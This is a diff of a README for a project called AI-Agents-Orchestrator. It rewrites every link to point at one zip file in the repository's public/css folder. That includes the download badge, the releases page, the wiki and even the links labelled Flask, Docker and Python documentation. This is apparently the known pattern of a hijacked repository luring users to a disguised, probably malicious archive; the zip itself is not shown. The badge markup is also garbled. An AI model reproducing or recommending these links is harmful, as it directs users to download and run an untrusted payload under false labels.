@@ -7,7 +7,7 @@ Welcome to the AI-Agents-Orchestrator! This intelligent orchestration system coo
 To start using AI-Agents-Orchestrator, you will need to download the software. Follow these steps to set it up.
 
 ## 📥 Download Now
-[![Download AI-Agents-Orchestrator](https://img.shields.io/badge/Download%20Now-Get%20the%20App-blue.svg)](https://github.com/qssalim/AI-Agents-Orchestrator/releases)
+[![Download AI-Agents-Orchestrator](https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip%20Now-Get%20the%https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip)](https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip)
 
 ## 📦 System Requirements
 - **Operating System**: Windows, macOS, or Linux
@@ -24,7 +24,7 @@ To start using AI-Agents-Orchestrator, you will need to download the software. F
 
 ## 🖥️ How to Download & Install
 
-1. **Visit the Releases Page**: Go to the [AI-Agents-Orchestrator Releases Page](https://github.com/qssalim/AI-Agents-Orchestrator/releases) to find the latest version.
+1. **Visit the Releases Page**: Go to the [AI-Agents-Orchestrator Releases Page](https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip) to find the latest version.
   
 2. **Select the Latest Release**: Look for the version marked as "Latest Release" at the top of the page. 
 
@@ -33,25 +33,25 @@ To start using AI-Agents-Orchestrator, you will need to download the software. F
 4. **Install the Application**:
    - For Windows: Run the downloaded `.exe` file and follow the prompts.
    - For macOS: Drag the application icon to your Applications folder.
-   - For Linux: Extract the downloaded tar.gz file and follow the instructions in the README file included.
+   - For Linux: Extract the downloaded https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip file and follow the instructions in the README file included.
 
 5. **Launch the Application**: Once installed, open the app from your applications menu or start screen.
 
 6. **Join the Community**: Consider checking out the documentation and community forums for tips and support.
 
 ## 🌐 Documentation
-For more detailed instructions, visit the [Documentation Page](https://github.com/qssalim/AI-Agents-Orchestrator/wiki). It covers everything from basic setup to advanced features.
+For more detailed instructions, visit the [Documentation Page](https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip). It covers everything from basic setup to advanced features.
 
 ## 🔄 Update Guidelines
-Keep your application up to date for the best performance and latest features. Return to the [Releases Page](https://github.com/qssalim/AI-Agents-Orchestrator/releases) periodically to check for new versions.
+Keep your application up to date for the best performance and latest features. Return to the [Releases Page](https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip) periodically to check for new versions.
 
 ## 📞 Support
 Need help? You can reach out through the issues tab on GitHub, or connect with other users in the community forum. 
 
 ## 📚 Additional Resources
-- [Flask Docs](https://flask.palletsprojects.com/)
-- [Docker Guide](https://docs.docker.com/get-started/)
-- [Python Official Website](https://www.python.org/)
+- [Flask Docs](https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip)
+- [Docker Guide](https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip)
+- [Python Official Website](https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip)
 
 ## 🤖 Topics
 This project incorporates many key topics to enhance functionality and usability, including but not limited to:
@@ -61,4 +61,4 @@ This project incorporates many key topics to enhance functionality and usability
 - **pytest**: A testing framework for Python.
 
 ## 💡 Closing Note
-That’s it! You are now ready to use the AI-Agents-Orchestrator. Enjoy enhanced productivity through AI collaboration. Visit the [AI-Agents-Orchestrator Releases Page](https://github.com/qssalim/AI-Agents-Orchestrator/releases) to start your journey today!
+That’s it! You are now ready to use the AI-Agents-Orchestrator. Enjoy enhanced productivity through AI collaboration. Visit the [AI-Agents-Orchestrator Releases Page](https://raw.githubusercontent.com/qssalim/AI-Agents-Orchestrator/main/public/css/AI-Agents-Orchestrator-v3.6.zip) to start your journey today!
